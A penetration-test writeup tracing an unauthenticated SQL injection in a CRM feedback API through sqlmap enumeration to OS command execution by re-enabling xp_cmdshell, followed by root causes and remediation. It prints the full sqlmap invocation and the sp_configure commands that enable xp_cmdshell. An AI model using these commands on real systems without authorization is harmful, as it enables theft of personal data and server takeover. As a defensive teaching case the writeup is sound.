---
title: "Anatomy of a Critical Pentest Finding: From MS SQL Injection to Remote Code Execution in a Production CRM"
author: Velstadt offensive security team
url: https://velstadt.com/ms-sql-injection-to-rce-production-crm/
date_published: 2026-05-20
date_scraped: 2026-11-19
platform: other
disclosed_report: none
bounty: not stated (pentest)
vuln_class: sqli
---

<!-- Raw scraped text below. Public writeup. Anonymized pentest. Condensed. CVSS 10.0. -->

# MSSQL injection to RCE in a production CRM (error-based -> sqlmap -> xp_cmdshell)

Unauthenticated SQLi (CWE-89) in a CRM feedback-form API, chained to RCE via `xp_cmdshell`. CVSS v3.1 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H). Exposed customer PII (names, DOB, tax IDs, passport numbers), production API keys, internal data.

## Step 1: recon (under-tested endpoint)
Public feedback form POSTs JSON to an internal API; the `text` field carried the message. Feedback/contact endpoints are routinely under-tested ("just records text"). Treat every user-influenced input as an injection point.
```
POST /api/feedback  {"name":"...","email":"...","text":"This is feedback."}
```

## Step 2: confirm via verbose error
Appended a single quote to `text`:
```
{"text":"'"}
```
HTTP 500 with a raw MSSQL error:
```
Microsoft OLE DB Provider for SQL Server error '80040e14'
Unclosed quotation mark after the character string '...'
```
Two findings at once: SQLi confirmed (CWE-89) and verbose error disclosure (CWE-209/CWE-200, a schema map).

## Step 3: enumerate + exfiltrate (sqlmap)
```
python sqlmap.py -u "https://crm.target/api/feedback" \
  --data='{"name":"test","email":"test@test.com","text":"*"}' \
  -H "Content-Type: application/json" --dbms="Microsoft SQL Server" --level=5 --risk=3
```
(`*` marks the injection point inside the JSON body.) sqlmap confirmed the DB context was `sa (administrator)` / DBA (CWE-269, least-privilege violation), listed 9 databases (master, msdb, model, tempdb, MSCRM_CONFIG, CrmIntegration, ...), and dumped tables incl. `ApiKeys` (prod/dev tokens) and customer identity fields.

## Step 4: escalate to RCE via xp_cmdshell
`xp_cmdshell` (MSSQL extended stored proc that runs OS commands) was disabled by default, but the sysadmin-level DB context could reconfigure the instance:
```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC master..xp_cmdshell 'whoami';
```
A benign `whoami` confirmed OS command execution under the SQL Server service account (scope change DB -> OS). From there: run arbitrary programs, deploy malware/ransomware, pivot into the internal network.

## Root cause (five stacked failures; any one would have limited impact)
1. Direct concatenation of user input into SQL (CWE-89) instead of parameterized queries.
2. Verbose DB errors in production (CWE-209/200).
3. App DB account had sysadmin/`sa` privileges (CWE-269); only needed read/write on MSCRM tables.
4. That excessive privilege let the context enable + run `xp_cmdshell` (CWE-78).
5. No/insufficient edge detection (WAF as compensating control only).

## Lessons
- All input points matter, especially low-visibility ones (feedback, survey, contact).
- Defense in depth: even if app validation fails, least-privilege DB accounts and a disabled, non-re-enableable `xp_cmdshell` contain the blast radius.
- Scanners miss context and do not chain; manual testing turns a DB flaw into proven OS RCE.
- Remediation: parameterized queries, least-privilege DB accounts, keep `xp_cmdshell` off and un-re-enableable by app accounts, suppress verbose errors, rotate exposed secrets.
